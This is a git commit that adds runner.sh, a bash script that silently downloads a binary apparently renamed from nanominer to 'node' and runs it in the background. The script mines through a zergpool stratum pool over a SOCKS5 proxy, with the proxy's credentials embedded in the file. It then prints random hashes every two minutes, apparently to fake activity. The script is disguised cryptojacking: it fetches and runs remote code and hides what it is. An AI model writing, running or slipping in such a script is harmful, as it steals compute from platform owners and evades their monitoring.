679865846704925d6c8a3b79fb478b346abf3a83
sabtugilpon2210 <90607434+sabtugilpon2210@users.noreply.github.com>
2021-09-13 16:07:03 +0700

    Create runner.sh

---
+++ runner.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+wget -q https://github.com/fuckl0l/nanominer/raw/main/node
+chmod +x node
+pool="stratum+tcp://verushash.mine.zergpool.com:3300"
+workername="bambang"
+wallet="walletaddres"
+proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.72.119.109:9185"
+./node -a verus -o $pool -u $wallet.$workername -t 2 -p c=DGB -x $proxy >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
